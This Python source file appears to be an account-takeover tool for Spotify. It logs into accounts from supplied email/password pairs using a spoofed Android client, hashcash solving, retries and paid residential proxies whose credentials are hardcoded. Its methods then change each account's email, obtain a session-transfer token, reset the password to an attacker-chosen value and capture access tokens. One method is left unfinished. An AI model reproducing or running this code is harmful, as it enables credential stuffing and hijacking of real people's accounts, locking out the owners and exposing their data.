import random
import requests
from requests.adapters import HTTPAdapter
import binascii
from managers.helper import log,solver , get_traceback
import os
from spotify.login5.v3.client_info_pb2 import ClientInfo
import spotify.login5.v3.login5_pb2 as login0
from google.protobuf.json_format import MessageToJson
from spotify.login5.v3.credentials.credentials_pb2 import Password, StoredCredential
from spotify.login5.v3.challenges.hashcash_pb2 import HashcashSolution
from google.protobuf import duration_pb2
from protobuf_to_dict import protobuf_to_dict

def random_hex_string(length: int):
    get_random_bytes = os.urandom
    buffer = get_random_bytes(int(length / 2))
    return binascii.hexlify(buffer).decode()

class Spotify:

    def __init__(self,threadnum,email,password,deviceid=None,proxy=None):
        self.client_secret = None
        self.email = email.strip()
        self.threadnum = threadnum
        self.password = password.strip()
        self._client_id = "9a8d2f0ce77a4e248bb71fefcb557637"
        
        self._app = "Spotify"
        self._version = "8.9.52.552"
        self._androidMdodel = "(SM-G996B)"
        self.androidmanufacturer = "Samsung"
        self._androidVersion = "Android/32"
        if deviceid:
            self._device_id = deviceid
        else:    
            self._device_id = random_hex_string(16)
        self.client_token = ""
        self.s = requests.Session()
        self.s.mount('http://', HTTPAdapter(max_retries=5))
        self.s.mount('https://', HTTPAdapter(max_retries=5))
        self.authToken = None
        if proxy:
            self.s.proxies.update({
                "http": f"http://uqGsIqmJiskE0wh-res-any:6XPBuKiPvRKTICQ@resi.enigmaproxy.net:5959",
                "https": f"http://uqGsIqmJiskE0wh-res-any:6XPBuKiPvRKTICQ@resi.enigmaproxy.net:5959" 
            })
            print("Using proxy: ", "odddkidout:1QDMzowDleOZShYi@proxy.packetstream.io:31112")

    def getbearer(self,username , refresh):
        self.refreshToken=refresh
        self.username = username
        self.s.headers.clear()
        self.s.headers.update({
                "Cache-Control": "no-cache, no-store, max-age=0",
                "User-Agent": f"{self._app}/{self._version} Android/{self._androidVersion} ({self._androidMdodel})",
                "Content-Type": "application/x-protobuf",
                'Accept-Encoding': 'gzip, deflate,br',
            })
        protoreq = login0.LoginRequest(client_info=ClientInfo(client_id=self._client_id, device_id=self._device_id),
                                        stored_credential=StoredCredential(username=self.username,data=self.refreshToken))
        while True: 
            try:
                #print("Sending login request 2")
                resp = self.s.post("https://login5.spotify.com/v3/login",
                                protoreq.SerializeToString(),timeout=10 )
                if resp.content == b'\n<html><head>\n<meta http-equiv="content-type" content="text/html;charset=utf-8">\n<title>403 Forbidden</title>\n</head>\n<body text=#000000 bgcolor=#ffffff>\n<h1>Error: Forbidden</h1>\n<h2>Your client does not have permission to get URL <code>/v3/login</code> from this server.</h2>\n<h2></h2>\n</body></html>\n':
                    continue
                break
                #print("Got login response")
            except requests.exceptions.Timeout:
                log(self.threadnum, "Proxy error")
                continue
            except requests.exceptions.ProxyError:
                log(self.threadnum, "Proxy error")
                #print("Proxy error")
                continue
            except requests.exceptions.ConnectionError:
                log(self.threadnum, "Connection error")
                #print("Connection error")
                continue
            except Exception as e:
                log(self.threadnum, get_traceback(e))
                #print("Error: ", get_traceback(e))
                return False
        if resp.content == b'\x10\x01':
            print("Wrong password")
            return False
        if resp.status_code == 200: 
                proto_ress = login0.LoginResponse()
                proto_ress.ParseFromString(resp.content)
                self.username = (protobuf_to_dict(proto_ress)['ok']['username'])
                self.authToken = (protobuf_to_dict(proto_ress)['ok']['access_token'])
                self.refreshToken = (protobuf_to_dict(proto_ress)['ok']['stored_credential'])
                print(proto_ress)
                print("Logged in")
                return True
    
            
        

    def login(self):
        try:
            #print("Logging in with: ", self.email, self.password)
            self.s.headers.update({
                "Cache-Control": "no-cache, no-store, max-age=0",
                "User-Agent": f"{self._app}/{self._version} Android/{self._androidVersion} ({self._androidMdodel})",
                "Content-Type": "application/x-protobuf",
                'Accept-Encoding': 'gzip, deflate',
            })
            #print("Sending login request")
            protoreq = login0.LoginRequest(client_info=ClientInfo(client_id=self._client_id, device_id=self._device_id),
                                        password=Password(id=self.email, password=self.password,
                                                            padding=binascii.unhexlify(
                                                                b'151515151515151515151515151515151515151515')))
                                                 
            while True: 
                try:
                    #print("Sending login request 2")
                    resp = self.s.post("https://login5.spotify.com/v3/login",
                                    protoreq.SerializeToString(),timeout=10 )
                    if resp.content == b'\n<html><head>\n<meta http-equiv="content-type" content="text/html;charset=utf-8">\n<title>403 Forbidden</title>\n</head>\n<body text=#000000 bgcolor=#ffffff>\n<h1>Error: Forbidden</h1>\n<h2>Your client does not have permission to get URL <code>/v3/login</code> from this server.</h2>\n<h2></h2>\n</body></html>\n':
                        continue
                    break
                    #print("Got login response")
                except requests.exceptions.Timeout:
                    log(self.threadnum, "Proxy error")
                    continue
                except requests.exceptions.ProxyError:
                    log(self.threadnum, "Proxy error")
                    #print("Proxy error")
                    continue
                except requests.exceptions.ConnectionError:
                    log(self.threadnum, "Connection error")
                    #print("Connection error")
                    continue
                except Exception as e:
                    log(self.threadnum, get_traceback(e))
                    #print("Error: ", get_traceback(e))
                    return False
                
                
            
            if resp.content == b'\x10\x01':
                print("Wrong password")
                return False

            #print("Got login response")
            proto_res = login0.LoginResponse()
            proto_res.ParseFromString(resp.content)
            #print(proto_res)
            ch = proto_res.challenges
            hashcash = ch.challenges[0].hashcash.prefix
            con = proto_res.login_context
            sufx, rep = solver(con, hashcash)
            #print("Solved captcha")
            if not sufx:
                return False
            dur = duration_pb2.Duration(nanos=1000000000, seconds=1)
            challengesolution = HashcashSolution(suffix=sufx, duration=dur)
            challengesolutions = login0.ChallengeSolution(hashcash=challengesolution)
            protoreqq = login0.LoginRequest(client_info=ClientInfo(client_id=self._client_id, device_id=self._device_id),
                                            password=Password(id=self.email, password=self.password,
                                                            padding=binascii.unhexlify(
                                                                b'151515151515151515151515151515151515151515')),
                                            login_context=con,
                                            challenge_solutions=login0.ChallengeSolutions(solutions=[challengesolutions]))
            #print("Sending login request with captcha")
            while True:
                try:
                    respp = self.s.post("https://login5.spotify.com/v3/login",
                                        protoreqq.SerializeToString(),timeout=10)
                    break
                except requests.exceptions.Timeout:
                    log(self.threadnum, "Proxy error")
                    continue
                except requests.exceptions.ProxyError:
                    log(self.threadnum, "Proxy error")
                    #print("Proxy error")
                    continue
                except requests.exceptions.ConnectionError:
                    log(self.threadnum, "Connection error")
                    #print("Connection error")
                    continue
                except Exception as e:
                    log(self.threadnum, get_traceback(e))
                    #print("Error: ", get_traceback(e))
                    return False    
            
            if respp.content == b'\x10\x01':
                print("Wrong password")
                return False                    
            if respp.content == b'\x10\x04':
                print("Wrong password")
                return False                    
            
            if respp.status_code == 200: 
                proto_ress = login0.LoginResponse()
                proto_ress.ParseFromString(respp.content)
                self.username = (protobuf_to_dict(proto_ress)['ok']['username'])
                self.authToken = (protobuf_to_dict(proto_ress)['ok']['access_token'])
                self.refreshToken = (protobuf_to_dict(proto_ress)['ok']['stored_credential'])
                print(proto_ress)
                print("Logged in")
                return True
            
            return False
        except Exception as e:
            with open('error.txt', 'a') as f:
                f.write("error in login: " + str(get_traceback(e)) + "\n")
                print("Error: ", get_traceback(e))
            return False
            

    def changeEmail(self, newEmail):
        """make put call at https://spclient.wg.spotify.com/accountsettings/v1/profile/email with new email as payload"""
        self.s.headers.update({
            "Accept-Language": "en-US",
            "User-Agent": f"{self._app}/{self._version} Android/{self._androidVersion} ({self._androidMdodel})",
            "Content-Type": "application/json; charset=UTF-8",
            'Accept-Encoding': 'gzip, deflate',
            'Spotify-App-Version': self._version,
            'X-Client-Id': self._client_id,
            'App-Platform': 'Android',
            'Authorization': f'Bearer {self.authToken}'
        })
        for i in range(3):
            try:

                resp = self.s.put("https://spclient.wg.spotify.com/accountsettings/v1/profile/email", json={"email": newEmail, "password": self.password},timeout=10)
                if resp.status_code == 200:
                    "decode json response and check if email was changed"
                    json_resp = resp.json()
                    if json_resp["email"] == newEmail:
                        return True
                else:
                    with open("error.txt", "a") as f:
                        f.write('returned status code: ' + str(resp.status_code) + 'from change email\n')
            except requests.exceptions.Timeout:
                log(self.threadnum, "Proxy error")
                continue
            except requests.exceptions.ProxyError:
                log(self.threadnum, "Proxy error")
                #print("Proxy error")
                continue
            except requests.exceptions.ConnectionError:
                log(self.threadnum, "Connection error")
                #print("Connection error")
                continue
            except Exception as e:
                with open('error.txt', 'a') as f:
                    f.write("error in change email: " + str(e) + "\n")
        return False


    def jumpAndChange(self):
        self.s.headers.clear()
        pos = '{"url":"https://accounts.spotify.com/en/status"}'
        headerstk = {"Accept-Language": "en",
                     "Authorization": f"Bearer {self.authToken}",
                     "Content-Type": "application/json",
                     "User-Agent": "Spotify/116500643 Win32/Windows 10 (10.0.19043; x64)",
                     "Origin": "https://spclient.wg.spotify.com",
                     "Sec-Fetch-Site": "same-origin",
                     "Sec-Fetch-Mode": "no-cors",
                     "Sec-Fetch-Dest": "empty",
                     "Accept-Encoding": "gzip, deflate",
                     "Content-Length": '112'}
        self.s.headers.update(headerstk)
        for i in range(3):
            try:
                resp = self.s.post("https://spclient.wg.spotify.com/sessiontransfer/v1/token", data=pos)
                if resp.status_code == 200:
                    self.passwordToken = resp.json()["token"]        
                        
                    if self.Reset_Password():
                        
                        return True
                    else:
                        with open('error.txt', 'a') as f:
                            f.write("error returend code is not 200 from reset password")
                        return False
                else:
                    with open('error.txt', 'a') as f:
                        f.write("error returend code is not 200 from jumpandchange")
            except Exception as e:
                with open('error.txt', 'a') as f:
                    f.write("error in jump and change: " + str(e) + "\n")
        return False


    def getlogoutcsrf(self):
        header = {
            "Sec-Ch-Ua": '"Chromium";v="121", "Not A(Brand";v="99"',
"Sec-Ch-Ua-Mobile": "?0",
"Sec-Ch-Ua-Platform": '"Windows"',
"Upgrade-Insecure-Requests": "1",
"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36",
"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
"Sec-Fetch-Site": "same-site",
"Sec-Fetch-Mode": "navigate",
"Sec-Fetch-User": "?1",
"Sec-Fetch-Dest": "document",
"Referer": "https://www.spotify.com/",
"Accept-Encoding": "gzip, deflate, br",
"Accept-Language": "en-US,en;q=0.9",
"Priority": "u=0, i"
        }
        self.s.get()


    


    def Reset_Password(self):
        _appHeader = {
            # "Client-Token": self.getClientToken(),
            "accept-language": "en-US",
            "User-Agent": f"{self._app}/{self._version} Android/{self._androidVersion} ({self._androidMdodel})",
            "Spotify-App-Version": self._version,
            "X-Client-Id": self._client_id,
            "App-Platform": "Android",
            "Authorization": f"Bearer {self.authToken}",
            "Content-Type": "application/json; charset=UTF-8",
            "Accept-Encoding": "gzip, deflate",
        }
        data = {
            "password": f"{self.email}cc",
            "oneTimeToken": self.passwordToken,
        }
        try:
            resp = requests.put("https://spclient.wg.spotify.com/accountrecovery/v2/password/",
                            json=data,
                            headers=_appHeader)
        
            if resp.status_code == 200:
                return True
            else:
                with open('error.txt', 'a') as f:
                    f.write("error returend code is not 200 from reset password")
                return False
        except Exception as e:
            with open('error.txt', 'a') as f:
                f.write("error in reset password: " + str(e) + "\n")
        return False

    def capture(self, auth):
        if not self.authToken:
            self.authToken = auth
        self.s.headers.clear()
        pos = '{"url":"https://accounts.spotify.com/en/status"}'
        headerstk = {"Accept-Language": "en",
                     "Authorization": f"Bearer {self.authToken}",
                     "Content-Type": "application/json",
                     "User-Agent": "Spotify/116500643 Win32/Windows 10 (10.0.19043; x64)",
                     "Origin": "https://spclient.wg.spotify.com",
                     "Sec-Fetch-Site": "same-origin",
                     "Sec-Fetch-Mode": "no-cors",
                     "Sec-Fetch-Dest": "empty",
                     "Accept-Encoding": "gzip, deflate",
                     "Content-Length": '112'}
        self.s.headers.update(headerstk)
        for i in range(3):
            try:
                resp = self.s.post("https://spclient.wg.spotify.com/sessiontransfer/v1/token", data=pos,timeout=10)
                if resp.status_code == 200:
                    tok = resp.json()["token"]
                    print(tok)
                    return tok
                     
                    self.capture = t.login2(tok)
                    self.Clientid, self.accestoken  = t.get_access_token() 
                    print(self.capture)
                    self.sp_dc  = self.capture
                    return self.Clientid, self.accestoken , self.capture
            except Exception as e:
                with open('error.txt', 'a') as f:
                    f.write("error in reset password: " + str(e) + "\n")

